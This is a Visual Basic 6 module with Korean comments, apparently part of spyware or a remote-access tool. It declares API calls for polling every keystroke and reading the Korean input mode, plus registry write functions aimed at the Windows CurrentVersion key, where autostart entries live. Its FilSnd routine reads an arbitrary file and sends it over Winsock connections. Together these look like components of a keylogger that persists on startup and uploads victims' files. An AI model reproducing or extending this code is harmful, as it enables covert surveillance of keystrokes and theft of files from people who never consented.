Attribute VB_Name = "Module1"
Option Explicit

Public Status As Integer
Public WIndex
'//////////////////////////////////////////////////////////////// 한글 자판
Public Declare Function ImmGetConversionStatus Lib "imm32.dll" (ByVal himc As Long, lpdw As Long, lpdw2 As Long) As Long
Public Declare Function ImmGetContext Lib "imm32.dll" (ByVal hwnd As Long) As Long
Public Declare Function GetForegroundWindow Lib "user32" () As Long
Public Const IME_CMODE_NATIVE = &H1
Public Const IME_CMODE_HANGLE = IME_CMODE_NATIVE
Public Const IME_CMODE_ALPHANUMERIC = &H0
Public Const IME_SMODE_NONE = &H0
'//////////////////////////////////////////////////////////////// 키보드 입력 체크
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer

Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
'////////////////////////////////////////////////////////////////////////////////////

Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Byte, ByVal cbData As Long) As Long
Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long

Public Const KeyName$ = "Software\microsoft\windows\currentversion"
Public Const HKEY_CLASSES_ROOT = &H80000000
Public Const HKEY_CURRENT_CONFIG = &H80000005
Public Const HKEY_CURRENT_USER = &H80000001
Public Const HKEY_DYN_DATA = &H80000006
Public Const HKEY_LOCAL_MACHINE = &H80000002
Public Const HKEY_PERFORMANCE_DATA = &H80000004
Public Const HKEY_USERS = &H80000003
Public Const ERROR_SUCCESS = 0&


Public Sub FilSnd(Fsdr As String)
    Dim DataF1() As Byte
    Dim siz As Long

    ' -- 확인
    If Dir(Fsdr) = "" Then Exit Sub

    ' -- 파일 크기
    siz = FileLen(Fsdr)

    ' -- 사이즈 먼저 보냄
    Form_Main.Winsock3(WIndex).SendData "/Fi:" & siz - 1
    DoEvents

    ' -- 바이너리로 읽기
    ''''메모리 줄이냐고 반씩 보낸다.''''
    ReDim DataF1((siz / 2) - 1)

    Open Fsdr For Binary Access Read As #1
        Get #1, , DataF1
        Form_Main.Winsock2.SendData DataF1
        DoEvents
    Close #1

    Open Fsdr For Binary Access Read As #1
        Get #1, (siz / 2) + 1, DataF1
        Form_Main.Winsock2.SendData DataF1
        DoEvents
    Close #1
End Sub
